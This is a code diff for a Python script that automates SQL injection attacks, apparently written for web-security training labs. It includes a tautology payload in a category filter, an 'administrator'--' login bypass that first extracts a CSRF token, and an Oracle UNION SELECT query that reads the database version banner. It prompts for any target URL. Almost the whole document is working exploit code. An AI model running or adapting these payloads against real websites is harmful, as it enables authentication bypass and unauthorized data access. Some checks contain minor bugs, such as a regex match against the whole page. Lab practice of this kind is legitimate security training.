@@ -23,9 +23,10 @@ class Sqli:
     def csrf_token_extract(self):
         try:
             url_get = self.session.get(url=self.login_url).text
-            csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
-            if not csrf:
-                raise print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
+            match = re.search(r'name="csrf" value="([^"]+)"', url_get)
+            if not match or match == None or match == "":
+                return False
+            csrf = match.group(1)
             return csrf
         except requests.exceptions.RequestException as e:
             print(f"RequestError: {e}")
@@ -36,8 +37,8 @@ class Sqli:
 
     def login(self, username, password):
         csrf_token = self.csrf_token_extract()
-        if csrf_token is None:
-            print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
+        if not csrf_token:
+            return False
         login_info = {
             "username": f"{username}", 
             "password": f"{password}", 
@@ -69,33 +70,63 @@ class Sqli:
         except requests.exceptions.RequestException as e:
             print(f"Error: Network request failed - {e}")
             return False
+    
+    def is_success(self, html_text):
+        string_match = r'Congratulations, you solved the lab!'
+        match = re.match(string_match, html_text)
+        if not match:
+            return False
+        return True
+
 
     def released_sqli(self):
         print("Trying released sqli")
-        exploit_result = self.session.get(url=f"{self.url}/filter?category=Gifts' or 1=1 --")
+        exploit_result = self.session.get(url=f"{self.url}/filter?category=' or 1=1 --")
         if exploit_result.status_code != 200:
             return False
+        
+        if not self.is_success(exploit_result.text):
+            return False 
+        
+        print("Exploit successfull.\nPayload: or 1=1 --")  
         return True
     
     def sqli_login_bypass(self):
+        print("Trying sqli login bypass")
         login_post_status = self.login("administrator'--", "hi")
         login_get_status = self.check_login()
         if not login_post_status and not login_get_status:
             return False
+        print("Exploit successfull.\nPayload: administrator'--")
         return True
-            
+    
+    def oracle_database(self):
+        exploit_result = self.session.get(url=f"{self.url}/filter?category=' union select null, banner from v$version --")
+        if exploit_result.status_code != 200:
+            return False
+        print("Exploit successfull. \nPayload: union select null, banner from v$version --")
     
     def main(self):
         exploit_methods = [
             ("released_sqli", self.released_sqli),
-            ("login_bypass", self.sqli_login_bypass)
+            ("login_bypass", self.sqli_login_bypass),
+            ("oracle_database", self.oracle_database)
         ]
 
         for method_name, method in exploit_methods:
-            if method():
-                print(f"{method_name} was successfull")
-            
-        print(f"Sorry")
+            try:
+                if method():
+                    print(f"{method_name} was successfull")
+                    print("Bye bye ˙◠˙")
+                    return True
+            except Exception as e:
+                print(f"{method_name} failed: {e}")
+                continue
+            except KeyboardInterrupt:
+                print("Keyboard interrupt detected. Exiting shell....")
+        
+        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
+        return False
         
 url = input("Enter the url: ")
 if url is not None or url != "":
